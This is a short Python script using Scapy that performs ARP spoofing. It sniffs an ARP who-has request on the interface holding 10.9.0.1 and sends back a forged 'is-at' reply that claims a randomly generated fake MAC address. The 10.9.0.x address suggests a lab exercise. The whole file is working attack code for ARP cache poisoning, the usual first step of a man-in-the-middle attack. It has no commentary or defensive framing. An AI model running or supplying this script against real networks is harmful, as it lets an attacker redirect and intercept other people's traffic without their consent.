#!/usr/bin/env python3
from scapy.all import *
import subprocess
from random import randint

def send_arp(op, pkt, fake_mac):
    arp = ARP(op = op, hwsrc = fake_mac, hwtype = 0x1, ptype = "IPv4", hwdst = pkt[ARP].hwsrc, psrc = pkt[ARP].pdst, pdst = pkt[ARP].psrc, hwlen = pkt[ARP].hwlen)
    pkt = arp
    send(pkt, verbose = False)
    print("The following ARP %s was sent back:\n" % (op))
    ls(pkt)
    print("-------------------------------------------------------------------------------------")

def arp_spoofing(pkt, fake_mac):
    if ARP in pkt and pkt[ARP].op == 1: #who-has
        print("\nARP %s from %s %s" % (pkt[ARP].op, pkt[ARP].hwsrc, pkt[ARP].psrc))
        send_arp("is-at", pkt, fake_mac)

def sniff_arp(pkt):
    pkt.show()

if __name__ == "__main__":
    cmd = "ip a | grep 10.9.0.1 | awk '{print $7}'"
    IFACE = subprocess.run(cmd, shell=True, check=True, universal_newlines=True, stdout=subprocess.PIPE).stdout.strip()
    fake_mac = "02:00:00:%02x:%02x:%02x" % (randint(0, 255), randint(0, 255), randint(0, 255))
    sniff(iface=IFACE, filter="arp[6:2] = 1", count = 1, store=0, prn = lambda pkt: arp_spoofing(pkt, fake_mac))
    #sniff(iface=IFACE, filter="arp", store=0, prn = sniff_arp)